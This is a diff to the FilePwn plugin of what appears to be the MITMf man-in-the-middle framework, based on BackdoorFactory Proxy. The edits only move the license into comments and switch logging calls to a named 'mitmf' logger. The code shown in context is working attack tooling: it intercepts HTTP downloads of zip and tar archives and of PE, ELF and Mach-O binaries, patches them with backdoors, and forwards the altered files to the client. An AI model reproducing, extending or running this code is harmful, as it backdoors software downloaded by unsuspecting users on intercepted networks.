@@ -18,43 +18,40 @@
 # USA
 #
 
-"""
-    BackdoorFactory Proxy (BDFProxy) v0.2 - 'Something Something'
-
-    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-
-    Copyright (c) 2013-2014, Joshua Pitts
-    All rights reserved.
-
-    Redistribution and use in source and binary forms, with or without modification,
-    are permitted provided that the following conditions are met:
-
-        1. Redistributions of source code must retain the above copyright notice,
-        this list of conditions and the following disclaimer.
-
-        2. Redistributions in binary form must reproduce the above copyright notice,
-        this list of conditions and the following disclaimer in the documentation
-        and/or other materials provided with the distribution.
-
-        3. Neither the name of the copyright holder nor the names of its contributors
-        may be used to endorse or promote products derived from this software without
-        specific prior written permission.
-
-    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
-    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
-    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
-    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
-    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
-    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
-    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
-    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
-    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
-    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
-    POSSIBILITY OF SUCH DAMAGE.
-
-    Tested on Kali-Linux.
-
-"""
+# BackdoorFactory Proxy (BDFProxy) v0.2 - 'Something Something'
+#
+# Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
+#
+# Copyright (c) 2013-2014, Joshua Pitts
+# All rights reserved.
+#
+# Redistribution and use in source and binary forms, with or without modification,
+# are permitted provided that the following conditions are met:
+#
+#   1. Redistributions of source code must retain the above copyright notice,
+#   this list of conditions and the following disclaimer.
+#
+#   2. Redistributions in binary form must reproduce the above copyright notice,
+#   this list of conditions and the following disclaimer in the documentation
+#   and/or other materials provided with the distribution.
+#
+#   3. Neither the name of the copyright holder nor the names of its contributors
+#   may be used to endorse or promote products derived from this software without
+#   specific prior written permission.
+#
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+# POSSIBILITY OF SUCH DAMAGE.
+#
+# Tested on Kali-Linux.
 
 import sys
 import os
@@ -73,6 +70,8 @@ from libs.bdfactory import machobin
 from plugins.plugin import Plugin
 from tempfile import mkstemp
 from configobj import ConfigObj
+
+mitmf_logger = logging.getLogger('mitmf')
 
 class FilePwn(Plugin):
     name       = "FilePwn"
@@ -303,7 +302,7 @@ class FilePwn(Plugin):
 
         if len(aTarFileBytes) > int(self.userConfig['TAR']['maxSize']):
             print "[!] TarFile over allowed size"
-            logging.info("TarFIle maxSize met %s", len(aTarFileBytes))
+            mitmf_logger.info("TarFIle maxSize met %s", len(aTarFileBytes))
             self.patched.put(aTarFileBytes)
             return
 
@@ -375,7 +374,7 @@ class FilePwn(Plugin):
 
                 if keywordCheck is True:
                     print "[!] Tar blacklist enforced!"
-                    logging.info('Tar blacklist enforced on %s', info.name)
+                    mitmf_logger.info('Tar blacklist enforced on %s', info.name)
                     continue
 
                 # Try to patch
@@ -396,16 +395,16 @@ class FilePwn(Plugin):
                             info.size = os.stat(file2).st_size
                             with open(file2, 'rb') as f:
                                 newTarFile.addfile(info, f)
-                            logging.info("%s in tar patched, adding to tarfile", info.name)
+                            mitmf_logger.info("%s in tar patched, adding to tarfile", info.name)
                             os.remove(file2)
                             wasPatched = True
                         else:
                             print "[!] Patching failed"
                             with open(tmp.name, 'rb') as f:
                                 newTarFile.addfile(info, f)
-                            logging.info("%s patching failed. Keeping original file in tar.", info.name)
+                            mitmf_logger.info("%s patching failed. Keeping original file in tar.", info.name)
                 if patchCount == int(self.userConfig['TAR']['patchCount']):
-                    logging.info("Met Tar config patchCount limit.")
+                    mitmf_logger.info("Met Tar config patchCount limit.")
 
             # finalize the writing of the tar file first
             newTarFile.close()
@@ -431,7 +430,7 @@ class FilePwn(Plugin):
 
         if len(aZipFile) > int(self.userConfig['ZIP']['maxSize']):
             print "[!] ZipFile over allowed size"
-            logging.info("ZipFIle maxSize met %s", len(aZipFile))
+            mitmf_logger.info("ZipFIle maxSize met %s", len(aZipFile))
             self.patched.put(aZipFile)
             return
 
@@ -452,7 +451,7 @@ class FilePwn(Plugin):
 
         except RuntimeError as e:
             if 'encrypted' in str(e):
-                logging.info('Encrypted zipfile found. Not patching.')
+                mitmf_logger.info('Encrypted zipfile found. Not patching.')
                 return aZipFile
 
         print "[*] ZipFile contents and info:"
@@ -488,7 +487,7 @@ class FilePwn(Plugin):
 
             if keywordCheck is True:
                 print "[!] Zip blacklist enforced!"
-                logging.info('Zip blacklist enforced on %s', info.filename)
+                mitmf_logger.info('Zip blacklist enforced on %s', info.filename)
                 continue
 
             patchResult = self.binaryGrinder(tmpDir + '/' + info.filename)
@@ -498,17 +497,17 @@ class FilePwn(Plugin):
                 file2 = "backdoored/" + os.path.basename(info.filename)
                 print "[*] Patching complete, adding to zip file."
                 shutil.copyfile(file2, tmpDir + '/' + info.filename)
-                logging.info("%s in zip patched, adding to zipfile", info.filename)
+                mitmf_logger.info("%s in zip patched, adding to zipfile", info.filename)
                 os.remove(file2)
                 wasPatched = True
             else:
                 print "[!] Patching failed"
-                logging.info("%s patching failed. Keeping original file in zip.", info.filename)
+                mitmf_logger.info("%s patching failed. Keeping original file in zip.", info.filename)
 
             print '-' * 10
 
             if patchCount >= int(self.userConfig['ZIP']['patchCount']):  # Make this a setting.
-                logging.info("Met Zip config patchCount limit.")
+                mitmf_logger.info("Met Zip config patchCount limit.")
                 break
 
         zippyfile.close()
@@ -547,7 +546,7 @@ class FilePwn(Plugin):
         if content_header in self.zipMimeTypes:
             
             if self.bytes_have_format(data, 'zip'):
-                logging.info("%s Detected supported zip file type!" % client_ip)
+                mitmf_logger.info("%s Detected supported zip file type!" % client_ip)
                 
                 process = multiprocessing.Process(name='zip', target=self.zip, args=(data,))
                 process.daemon = True
@@ -556,13 +555,13 @@ class FilePwn(Plugin):
                 bd_zip = self.patched.get()
 
                 if bd_zip:
-                    logging.info("%s Patching complete, forwarding to client" % client_ip)
+                    mitmf_logger.info("%s Patching complete, forwarding to client" % client_ip)
                     return {'request': request, 'data': bd_zip}
 
             else:
                 for tartype in ['gz','bz','tar']:
                     if self.bytes_have_format(data, tartype):
-                        logging.info("%s Detected supported tar file type!" % client_ip)
+                        mitmf_logger.info("%s Detected supported tar file type!" % client_ip)
                         
                         process = multiprocessing.Process(name='tar_files', target=self.tar_files, args=(data,))
                         process.daemon = True
@@ -571,14 +570,14 @@ class FilePwn(Plugin):
                         bd_tar = self.patched.get()
 
                         if bd_tar:
-                            logging.info("%s Patching complete, forwarding to client" % client_ip)
+                            mitmf_logger.info("%s Patching complete, forwarding to client" % client_ip)
                             return {'request': request, 'data': bd_tar}
 
         
         elif content_header in self.binaryMimeTypes:
             for bintype in ['pe','elf','fatfile','machox64','machox86']:
                 if self.bytes_have_format(data, bintype):
-                    logging.info("%s Detected supported binary type!" % client_ip)
+                    mitmf_logger.info("%s Detected supported binary type!" % client_ip)
                     fd, tmpFile = mkstemp()
                     with open(tmpFile, 'w') as f:
                         f.write(data)
@@ -592,9 +591,9 @@ class FilePwn(Plugin):
                     if patchb:
                         bd_binary = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
                         os.remove('./backdoored/' + os.path.basename(tmpFile))
-                        logging.info("%s Patching complete, forwarding to client" % client_ip)
+                        mitmf_logger.info("%s Patching complete, forwarding to client" % client_ip)
                         return {'request': request, 'data': bd_binary}
 
         else:
-            logging.debug("%s File is not of supported Content-Type: %s" % (client_ip, content_header))
+            mitmf_logger.debug("%s File is not of supported Content-Type: %s" % (client_ip, content_header))
             return {'request': request, 'data': data}
